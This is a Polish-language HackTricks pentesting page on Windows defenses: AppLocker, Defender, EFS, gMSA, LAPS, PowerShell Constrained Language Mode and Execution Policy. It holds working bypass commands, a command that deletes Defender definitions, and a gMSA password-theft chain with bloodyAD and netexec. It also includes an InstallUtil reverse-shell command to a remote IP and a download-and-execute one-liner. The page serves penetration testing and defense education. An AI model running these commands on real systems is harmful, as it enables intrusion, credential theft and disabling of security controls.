# Kontrole bezpieczeństwa Windows

{{#include ../../banners/hacktricks-training.md}}

## Polityka AppLocker

Lista dopuszczonych aplikacji to spis zatwierdzonego oprogramowania lub plików wykonywalnych, które mogą znajdować się i być uruchamiane w systemie. Celem jest ochrona środowiska przed szkodliwym malware i niezatwierdzonym oprogramowaniem, które nie odpowiada specyficznym potrzebom biznesowym organizacji.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's **rozwiązanie do tworzenia listy dopuszczonych aplikacji** i daje administratorom systemu kontrolę nad **które aplikacje i pliki użytkownicy mogą uruchamiać**. Zapewnia **szczegółową kontrolę** nad plikami wykonywalnymi, skryptami, plikami instalacyjnymi Windows, DLLs, packaged apps, and packed app installers.\
Organizacje często **blokują cmd.exe i PowerShell.exe** oraz zapisywanie do niektórych katalogów, **ale wszystko to można obejść**.

### Sprawdź

Sprawdź, które pliki/rozszerzenia są na czarnej liście/na białej liście:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ta ścieżka rejestru zawiera konfiguracje i polityki stosowane przez AppLocker, umożliwiając przeglądanie aktualnego zestawu reguł egzekwowanych w systemie:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Przydatne **Writable folders** do bypass AppLocker Policy: Jeśli AppLocker pozwala na uruchamianie czegokolwiek wewnątrz `C:\Windows\System32` lub `C:\Windows`, istnieją **writable folders**, których możesz użyć, aby to **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Powszechnie **zaufane** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaria mogą być również przydatne do obejścia AppLocker.
- **Źle napisane reguły można również obejść**
- Na przykład, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, możesz utworzyć **folder o nazwie `allowed`** w dowolnym miejscu i będzie on dozwolony.
- Organizacje często koncentrują się na **blokowaniu pliku wykonywalnego `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ale zapominają o **innych** [**lokalizacjach plików wykonywalnych PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), takich jak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` lub `PowerShell_ISE.exe`.
- **Wymuszanie DLL jest bardzo rzadko włączane** z powodu dodatkowego obciążenia, jakie może to wprowadzić do systemu, oraz ilości testów wymaganych, aby upewnić się, że nic nie przestanie działać. Dlatego używanie **DLL jako backdoorów pomoże obejść AppLocker**.
- Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) aby **wykonywać kod Powershell** w dowolnym procesie i obejść AppLocker. Więcej informacji: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Przechowywanie poświadczeń

### Menedżer Kont Bezpieczeństwa (SAM)

Lokalne poświadczenia znajdują się w tym pliku; hasła są przechowywane w postaci haszy.

### Lokalny Autorytet Bezpieczeństwa (LSA) - LSASS

Poświadczenia (hashe) są zapisywane w pamięci tego podsystemu ze względu na Single Sign-On.\
LSA zarządza lokalną **polityką bezpieczeństwa** (polityką haseł, uprawnieniami użytkowników...), **uwierzytelnianiem**, **tokenami dostępu**...\
LSA będzie tym, który **sprawdzi** podane poświadczenia w pliku **SAM** (dla logowania lokalnego) i **skontaktuje się** z **kontrolerem domeny**, aby uwierzytelnić użytkownika domenowego.

Poświadczenia są zapisywane w procesie **LSASS**: bilety Kerberos, hashe NT i LM, łatwo odszyfrowywalne hasła.

### Sekrety LSA

LSA może zapisać na dysku niektóre poświadczenia:

- Hasło konta komputera w Active Directory (gdy kontroler domeny jest niedostępny).
- Hasła kont usług Windows.
- Hasła dla zaplanowanych zadań.
- Inne (hasło aplikacji IIS...).

### NTDS.dit

Jest to baza danych Active Directory. Występuje tylko na kontrolerach domeny.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) to antywirus dostępny w Windows 10 i Windows 11 oraz w wersjach Windows Server. Blokuje popularne narzędzia pentestingowe, takie jak **`WinPEAS`**. Istnieją jednak sposoby na obejście tych zabezpieczeń.

### Sprawdzenie

Aby sprawdzić **status** Defendera możesz uruchomić cmdlet PowerShell **`Get-MpComputerStatus`** (sprawdź wartość **`RealTimeProtectionEnabled`**, aby dowiedzieć się, czy jest aktywny):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Aby je wyenumerować możesz także uruchomić:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Szyfrowany system plików (EFS)

EFS zabezpiecza pliki przez szyfrowanie, wykorzystując **symetryczny klucz** znany jako **File Encryption Key (FEK)**. Ten klucz jest szyfrowany przy użyciu **klucza publicznego** użytkownika i przechowywany w $EFS **alternative data stream** zaszyfrowanego pliku. Gdy potrzebne jest odszyfrowanie, odpowiadający **klucz prywatny** certyfikatu cyfrowego użytkownika jest używany do odszyfrowania FEK ze strumienia $EFS. Więcej informacji można znaleźć [tutaj](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenariusze odszyfrowania bez inicjacji przez użytkownika** obejmują:

- Gdy pliki lub foldery są przenoszone do systemu plików nieobsługującego EFS, takiego jak [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), są one automatycznie odszyfrowywane.
- Zaszyfrowane pliki wysyłane przez sieć za pomocą protokołu SMB/CIFS są odszyfrowywane przed transmisją.

Ta metoda szyfrowania pozwala na **przezroczysty dostęp** do zaszyfrowanych plików dla właściciela. Jednak samo zmienienie hasła właściciela i zalogowanie się nie umożliwi odszyfrowania.

**Kluczowe wnioski**:

- EFS używa symetrycznego FEK, szyfrowanego kluczem publicznym użytkownika.
- Odszyfrowanie wykorzystuje klucz prywatny użytkownika do dostępu do FEK.
- Automatyczne odszyfrowanie występuje w określonych warunkach, np. przy kopiowaniu na FAT32 lub transmisji sieciowej.
- Zaszyfrowane pliki są dostępne dla właściciela bez dodatkowych kroków.

### Sprawdź informacje o EFS

Sprawdź, czy **użytkownik** **używał** tej **usługi**, sprawdzając, czy istnieje ta ścieżka: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Sprawdź **kto** ma **dostęp** do pliku używając cipher /c \<file\>  
Możesz też użyć `cipher /e` i `cipher /d` wewnątrz folderu, aby **zaszyfrować** i **odszyfrować** wszystkie pliki

### Odszyfrowywanie plików EFS

#### Posiadanie uprawnień SYSTEM

Ta metoda wymaga, aby **ofiarowany użytkownik** miał uruchomiony **proces** na hoście. Jeśli tak jest, używając sesji `meterpreter` możesz podszyć się pod token procesu użytkownika (`impersonate_token` z `incognito`). Lub możesz po prostu `migrate` do procesu użytkownika.

#### Znając hasło użytkownika


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Grupowe zarządzane konta usług (gMSA)

Microsoft opracował **Group Managed Service Accounts (gMSA)**, aby uprościć zarządzanie kontami usług w infrastrukturach IT. W przeciwieństwie do tradycyjnych kont usług, które często mają włączone ustawienie "**Password never expire**", gMSA oferują bezpieczniejsze i łatwiejsze w zarządzaniu rozwiązanie:

- **Automatyczne zarządzanie hasłami**: gMSA używają złożonego, 240-znakowego hasła, które automatycznie zmienia się zgodnie z polityką domeny lub komputera. Proces ten jest obsługiwany przez Key Distribution Service (KDC) Microsoftu, eliminując potrzebę ręcznej aktualizacji haseł.
- **Zwiększone bezpieczeństwo**: te konta są odporne na blokady i nie mogą być używane do logowań interaktywnych, co podnosi ich bezpieczeństwo.
- **Wsparcie dla wielu hostów**: gMSA mogą być współdzielone pomiędzy wieloma hostami, co czyni je idealnymi dla usług uruchamianych na wielu serwerach.
- **Możliwość uruchamiania zaplanowanych zadań**: w przeciwieństwie do managed service accounts, gMSA obsługują uruchamianie zadań zaplanowanych.
- **Uproszczone zarządzanie SPN**: system automatycznie aktualizuje Service Principal Name (SPN) przy zmianach danych sAMAccount komputera lub nazwy DNS, upraszczając zarządzanie SPN.

Hasła dla gMSA są przechowywane w atrybucie LDAP _**msDS-ManagedPassword**_ i są automatycznie resetowane co 30 dni przez Domain Controllers (DCs). To hasło, szyfrowany blob danych znany jako [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), może być pobrane tylko przez upoważnionych administratorów i serwery, na których gMSA są zainstalowane, zapewniając bezpieczne środowisko. Aby uzyskać ten zasób, wymagana jest zabezpieczona łączność, taka jak LDAPS, lub połączenie musi być uwierzytelnione z 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Hasło to można odczytać za pomocą [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Sprawdź także tę [web page](https://cube0x0.github.io/Relaying-for-gMSA/) dotyczącą tego, jak przeprowadzić **NTLM relay attack**, aby **odczytać** **hasło** **gMSA**.

### Abusing ACL chaining to read gMSA managed password (GenericAll -> ReadGMSAPassword)

W wielu środowiskach użytkownicy o niskich uprawnieniach mogą pivotować do sekretów gMSA bez kompromitacji DC, nadużywając źle skonfigurowanych ACL obiektów:

- Grupie, którą możesz kontrolować (np. poprzez GenericAll/GenericWrite), przyznano `ReadGMSAPassword` nad gMSA.
- Dodając siebie do tej grupy, odziedziczasz prawo do odczytania blobu `msDS-ManagedPassword` gMSA przez LDAP i wyprowadzenia użytecznych poświadczeń NTLM.

Typowy przebieg:

1) Odkryj ścieżkę za pomocą BloodHound i oznacz swoje foothold principals jako Owned. Szukaj relacji takich jak:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Dodaj siebie do pośredniej grupy, którą kontrolujesz (przykład z bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Odczytaj zarządzane hasło gMSA przez LDAP i wyprowadź hash NTLM. NetExec automatyzuje ekstrakcję `msDS-ManagedPassword` i konwersję do NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Uwierzytelnij się jako gMSA używając hashu NTLM (no plaintext needed). Jeśli konto znajduje się w Remote Management Users, WinRM zadziała bezpośrednio:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notatki:
- Odczyty LDAP `msDS-ManagedPassword` wymagają sealingu (np. LDAPS/sign+seal). Narzędzia obsługują to automatycznie.
- gMSAs często otrzymują lokalne uprawnienia, takie jak WinRM; sprawdź członkostwo w grupach (np. Remote Management Users), aby zaplanować lateral movement.
- Jeśli potrzebujesz tylko blobu, aby samodzielnie obliczyć NTLM, zobacz strukturę MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), umożliwia zarządzanie hasłami konta lokalnego Administratora. Hasła te, które są losowo generowane, unikatowe i regularnie zmieniane, są przechowywane centralnie w Active Directory. Dostęp do tych haseł jest ograniczony przez ACL do upoważnionych użytkowników. Jeśli przyznane są odpowiednie uprawnienia, możliwy jest odczyt haseł lokalnego administratora.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ogranicza wiele funkcji** potrzebnych do efektywnego używania PowerShell, takich jak blokowanie obiektów COM, zezwalanie tylko na zatwierdzone typy .NET, workflow oparty na XAML, klasy PowerShell i inne.

### **Sprawdź**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
W obecnych wersjach Windows ten Bypass nie zadziała, ale możesz użyć[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Aby to skompilować, może być konieczne** **aby** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> dodaj `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **change the project to .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonać kod Powershell** w dowolnym procesie i ominąć tryb ograniczony. Więcej informacji: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS Execution Policy

Domyślnie jest ustawiona na **restricted.** Główne sposoby obejścia tej polityki:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Więcej informacji można znaleźć [tutaj](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

To API, które może być użyte do uwierzytelniania użytkowników.

SSPI odpowiada za znalezienie odpowiedniego protokołu dla dwóch maszyn, które chcą się komunikować. Preferowaną metodą jest Kerberos. SSPI negocjuje, który protokół uwierzytelniania zostanie użyty; protokoły te nazywane są Security Support Provider (SSP), znajdują się na każdej maszynie Windows w formie DLL i obie maszyny muszą obsługiwać ten sam, aby mogły się komunikować.

### Main SSPs

- **Kerberos**: Preferowany
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Dla kompatybilności
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Serwery WWW i LDAP, hasło w postaci skrótu MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Używany do negocjowania protokołu (Kerberos lub NTLM; domyślnie Kerberos)
- %windir%\Windows\System32\lsasrv.dll

#### Negocjacja może zaoferować kilka metod lub tylko jedną.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja, która umożliwia **wyświetlanie monitu o zgodę przy operacjach wymagających podwyższenia uprawnień**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Źródła

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
